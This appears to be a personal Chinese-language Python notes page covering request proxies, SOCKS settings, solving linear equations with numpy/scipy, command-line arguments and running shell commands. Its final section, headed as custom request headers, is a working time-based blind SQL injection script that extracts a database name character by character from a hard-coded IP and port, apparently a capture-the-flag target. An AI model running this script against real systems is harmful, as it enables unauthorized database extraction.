# python

## requests 模块 使用代理

requests使用代理要比urllib简单多了…这里以单次代理为例. 多次的话可以用session一类构建.

如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求:

```python
import requests

proxies = {
  "http": "http://10.10.1.10:3128",
  "https": "http://10.10.1.10:1080",
}

r=requests.get("http://icanhazip.com", proxies=proxies)
print r.text


```



### 使用全局代理



```python
import socks
import socket
from urllib import request
from urllib.error import URLError

socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9742)
socket.socket = socks.socksocket
try:
    response = request.urlopen('http://httpbin.org/get')
    print(response.read().decode('utf-8'))
except URLError as e:
    print(e.reason)
```



## numpy

### 解多元一次方程

> x+y=10
> x+z=20
> y+z=24

```python
import numpy as np
#导入指定成员
from scipy.linalg import solve 
a = np.array([[1, 1,0], [1,0,1], [0,1, 1]])
b = np.array([10, 20, 24])
x = solve(a, b)
print(x)
```



## python 装饰器

 https://foofish.net/python-decorator.html 



## python命令行

### 命令行参数读取

`sys.argv[x]`



## Python执行系统命令并获得输出




```python
import os
 
print(os.popen('uptime').read())

 
```



```python
import subprocess
 
res = subprocess.Popen('uptime',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)
result = res.stdout.readlines()
 
```



## 自定义请求头



```python
import requests
import hackhttp 
import urllib
import socket

ip = '111.186.57.61'
port = 10601

def send_raw(raw):

    try:
        with socket.create_connection((ip, port), timeout=2) as conn:
            conn.send(bytes(raw,encoding="ascii"))
            res = conn.recv(10240).decode()

    except:
        return True
    
    return False



def rawhttp(sql):
    sql=urllib.parse.quote(sql)
    burp0_url = "http://111.186.57.61:10601/?age={}".format(sql)
    raw='''GET /?age={} HTTP/1.1
Host: 111.186.57.61:10601
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Length: 0
Content-Length: 0

'''.format(sql).replace("\n","\r\n")
    return send_raw(raw)


l='0123456789ABCDEF'
result=""
for j in range(10):
    for i in l:
        sql="if((select substr(hex(database()),{},1))=char({}),sleep(10),0)".format(j+1,ord(i))
        if rawhttp(sql):
            result+=i
            print(result)
            break
        else :
            print("第{}个字符不是{}".format(j+1,i))
        




```

